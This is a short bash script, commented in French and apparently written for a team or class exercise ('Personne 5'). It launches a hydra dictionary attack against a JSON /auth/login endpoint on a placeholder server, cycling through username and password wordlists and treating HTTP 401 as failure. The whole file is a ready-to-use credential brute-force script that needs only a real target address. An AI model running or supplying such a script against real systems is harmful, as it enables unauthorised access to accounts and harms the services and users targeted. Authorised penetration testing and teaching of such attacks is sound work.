#!/bin/bash
# === Attaque par dictionnaire sur le login JSON - Personne 5 ===
CIBLE="IP_DU_SERVEUR"
USERS="utilisateurs.txt"
PASS="mots_de_passe.txt"

echo "=== Attaque dictionnaire sur $CIBLE /auth/login ==="
date

# Le login attend du JSON : {"login":"...","password":"..."}
hydra -L "$USERS" -P "$PASS" "$CIBLE" \
  http-post-form "/auth/login:{\"login\":\"^USER^\",\"password\":\"^PASS^\"}:C=application/json:F=401" \
  -V

echo "=== Fin ==="
date
